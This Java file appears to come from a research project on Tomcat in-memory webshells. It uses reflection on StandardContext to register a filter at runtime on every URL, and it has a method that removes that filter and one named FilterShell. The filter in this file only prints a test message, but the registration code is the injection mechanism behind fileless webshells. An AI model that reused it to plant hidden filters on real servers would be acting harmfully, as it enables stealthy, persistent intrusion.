package com.spkiddai.memoryserver.Test;

import com.spkiddai.memoryserver.Shell.FilterShell;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.List;
import java.util.Map;

public class FilterTest implements Filter {

    String filterpattern = "/*";

    // 初始化方法
    public void init(FilterConfig filterConfig) {
    }

    // 执行过滤逻辑的核心方法
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        servletResponse.getWriter().println("FilterTest Registration Example");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    // 销毁方法
    public void destroy() {
    }

    /**
     * 向Tomcat注册过滤器。
     *
     * @param request 当前的HttpServletRequest请求对象。
     */
    public void addFilter(HttpServletRequest request) throws Exception {
        ServletContext servletContext = request.getServletContext();

        if (servletContext.getFilterRegistration(this.getClass().getSimpleName()) == null) {
            StandardContext context = getContext(servletContext);

            // 创建FilterTest实例
            Filter filterClass = new FilterTest();

            // 添加Filter定义
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filterClass);
            filterDef.setFilterName(this.getClass().getSimpleName());
            filterDef.setFilterClass(this.toString());
            context.addFilterDef(filterDef);

            // 添加Filter映射
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(filterpattern);
            filterMap.setFilterName(this.getClass().getSimpleName());
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            context.addFilterMap(filterMap);

            // 创建ApplicationFilterConfig实例
            Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
            constructor[0].setAccessible(true);
            ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(context, filterDef);

            // 设置filterConfigs
            Field filterConfigsField = context.getClass().getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            Map filterConfigs = (Map) filterConfigsField.get(context);
            filterConfigs.put(this.getClass().getSimpleName(), config);
        }
    }

    /**
     * 从Tomcat中删除指定的Filter。
     *
     * @param request 当前的HttpServletRequest请求对象
     */
    public void rmFilter(HttpServletRequest request) throws Exception {
        ServletContext servletContext = request.getServletContext();
        StandardContext context = getContext(servletContext);

        List<String> filterNames = Arrays.asList(this.getClass().getSimpleName(), FilterShell.class.getSimpleName());

        // 获取FilterDefs
        Method findFilterDefsMethod = context.getClass().getMethod("findFilterDefs");
        Object[] filterDefs = (Object[]) findFilterDefsMethod.invoke(context);
        for (Object filterDef : filterDefs) {
            Method getFilterNameMethod = filterDef.getClass().getMethod("getFilterName");
            String filterNameFromDef = (String) getFilterNameMethod.invoke(filterDef);
            if (filterNames.contains(filterNameFromDef)) {

                // 删除指定的FilterDef
                Method removeFilterDefMethod = context.getClass().getMethod("removeFilterDef", filterDef.getClass());
                removeFilterDefMethod.invoke(context, filterDef);
            }
        }

        // 获取FilterMaps
        Method findFilterMapsMethod = context.getClass().getMethod("findFilterMaps");
        Object[] filterMaps = (Object[]) findFilterMapsMethod.invoke(context);
        for (Object filterMap : filterMaps) {
            Method getFilterNameMethod = filterMap.getClass().getMethod("getFilterName");
            String filterName = (String) getFilterNameMethod.invoke(filterMap);
            if (filterNames.contains(filterName)) {


                // 删除指定的Filter映射
                Method removeFilterMapMethod = context.getClass().getMethod("removeFilterMap", FilterMap.class);
                removeFilterMapMethod.invoke(context, filterMap);
            }
        }
    }

    /**
     * 从ServletContext中获取StandardContext对象
     *
     * @param servletContext Servlet上下文对象
     * @return 返回StandardContext对象
     */
    public static StandardContext getContext(ServletContext servletContext) throws Exception {
        StandardContext context = null;

        while (context == null) {
            Field f = servletContext.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object object = f.get(servletContext);

            if (object instanceof ServletContext) {
                servletContext = (ServletContext) object;
            } else if (object instanceof StandardContext) {
                context = (StandardContext) object;
            }
        }
        return context;
    }
}
